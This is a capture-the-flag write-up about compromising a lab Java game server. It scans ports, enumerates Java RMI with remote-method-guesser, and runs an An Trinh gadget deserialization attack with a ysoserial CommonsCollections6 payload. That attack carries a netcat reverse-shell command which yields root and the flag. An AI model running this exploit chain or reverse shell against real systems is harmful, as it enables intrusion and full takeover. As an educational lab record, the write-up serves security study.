Miscellaneous: Arkanoid
====================================

## Task
Ahoy, officer,

a new server with a video game is to be placed in the ship's relaxation center . Your task is to check whether the server does not contain any vulnerabilities.

May you have fair winds and following seas!

The game server has domain name arkanoid.cns-jv.tcc.

## Solution
Let's scan TCP ports on hostname:

	└─# nmap -p1-65535 arkanoid.cns-jv.tcc
	Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 16:31 EDT
	Nmap scan report for arkanoid.cns-jv.tcc (10.99.0.102)
	Host is up (0.028s latency).
	Not shown: 65531 closed tcp ports (reset)
	PORT      STATE SERVICE
	8000/tcp  open  http-alt
	32867/tcp open  unknown
	60001/tcp open  unknown
	60002/tcp open  unknown

First interesting port is 8000. Opened in browser, there is arkanoid game, written in JavaScript. According to code, after successful end of the game is called url /score?data=15. And according to headers from HTTP response is running on Java. I've tried to do something with /score URL but shown nothing interesting. So, we can look on other ports:

	└─# nmap -sVC -p60001-60002 arkanoid.cns-jv.tcc 
	Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 16:35 EDT
	Nmap scan report for arkanoid.cns-jv.tcc (10.99.0.102)
	Host is up (0.019s latency).

	PORT      STATE SERVICE  VERSION
	60001/tcp open  java-rmi Java RMI
	| rmi-dumpregistry: 
	|   jmxrmi
	|      implements javax.management.remote.rmi.RMIServer, 
	|     extends
	|       java.lang.reflect.Proxy
	|       fields
	|           Ljava/lang/reflect/InvocationHandler; h
	|             java.rmi.server.RemoteObjectInvocationHandler
	|             @localhost:60002
	|             extends
	|_              java.rmi.server.RemoteObject
	60002/tcp open  java-rmi Java RMI

Seems interesting. After some investigation and learning about java application I've find out great tool: rmg (https://github.com/qtc-de/remote-method-guesser). So I've downloaded tool and tried some tricks from documentation:

	└─# java -jar rmg.jar enum 10.99.0.102 60001                                          
	[+] RMI registry bound names:
	[+]
	[+]     - jmxrmi
	[+]             --> javax.management.remote.rmi.RMIServer (known class: JMX Server)
	[+]                 Endpoint: localhost:60002  TLS: no  ObjID: [-4e08268b:18b43f4c9a1:-7fff, 2190267234128201716]
	[+]
	[+] RMI server codebase enumeration:
	[+]
	[+]     - The remote server does not expose any codebases.
	[+]
	[+] RMI server String unmarshalling enumeration:
	[+]
	[+]     - Caught ClassNotFoundException during lookup call.
	[+]       --> The type java.lang.String is unmarshalled via readObject().
	[+]       Configuration Status: Outdated
	[+]
	[+] RMI server useCodebaseOnly enumeration:
	[+]
	[+]     - Caught ClassCastException during lookup call.
	[+]       --> The server ignored the provided codebase (useCodebaseOnly=true).
	[+]       Configuration Status: Current Default
	[+]
	[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
	[+]
	[-]     - Caught AccessException during unbindcall.
	[-]       --> The server seems to use a SingleEntryRegistry (probably JMX based).
	[+]       Vulnerability Status: Undecided
	[+]
	[+] RMI Security Manager enumeration:
	[+]
	[+]     - Caught Exception containing 'no security manager' during RMI call.
	[+]       --> The server does not use a Security Manager.
	[+]       Configuration Status: Current Default
	[+]
	[+] RMI server JEP290 enumeration:
	[+]
	[+]     - DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
	[+]       Vulnerability Status: Non Vulnerable
	[+]
	[+] RMI registry JEP290 bypass enumeration:
	[+]
	[+]     - Caught IllegalArgumentException after sending An Trinh gadget.
	[+]       Vulnerability Status: Vulnerable
	[+]
	[+] RMI ActivationSystem enumeration:
	[+]
	[+]     - Caught NoSuchObjectException during activate call (activator not present).
	[+]       Configuration Status: Current Default

Ok, I've found some vulnerability which, regarding to documentation, allows me to run commands on remote system using Trinh gadget. So, read something about Trinh gadget in documentation and let's try to get shell. In one terminal, run netcat:

	└─# nc -lvp 4445                      
	listening on [any] 4445 ..

On second terminal run listener (10.200.0.21 is my IP address assigned on VPN):

	└─# java -jar rmg.jar listen 10.200.0.21 4444 CommonsCollections6 'nc 10.200.0.21 4445 -c sh'
	[+] Creating ysoserial payload... done.
	[+] Creating a JRMPListener on 10.200.0.21:4444.
	[+] Handing off to ysoserial...

And third terminal, perform attack:

	└─# java -jar rmg.jar serial 10.99.0.102 60001 AnTrinh 10.200.0.21:4444 --component reg
	[+] Attempting deserialization attack on RMI Registry endpoint...
	[+]
	[+]     Caught javax.management.BadAttributeValueExpException during deserialization attack.
	[+]     This could be caused by your gadget an the attack probably worked anyway.
	[+]     If it did not work, you can retry with --stack-trace to see the details.

Get back to the first terminal. And try to send id command:

	connect to [10.200.0.21] from arkanoid.cns-jv.tcc [10.99.0.102] 52360
	id
	uid=0(root) gid=0(root) groups=0(root)

Whooohooo, we have root shell! There is nothing what we can't do right now. Just the flag, where is the flag? Long story short: after searching on filesystem even in file's content I tried the most simple thing - let's look on system environment variables:

	env
	HOSTNAME=4eddc08ea861
	HOME=/root
	PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
	XFILESEARCHPATH=/usr/dt/app-defaults/%L/Dt
	NLSPATH=/usr/dt/lib/nls/msg/%L/%N.cat
	JAVA_HOME=/opt/jdk1.8.0_144
	PWD=/opt
	FLAG=FLAG{sEYj-80fd-EtkR-0fHv}

Mission completed :-)
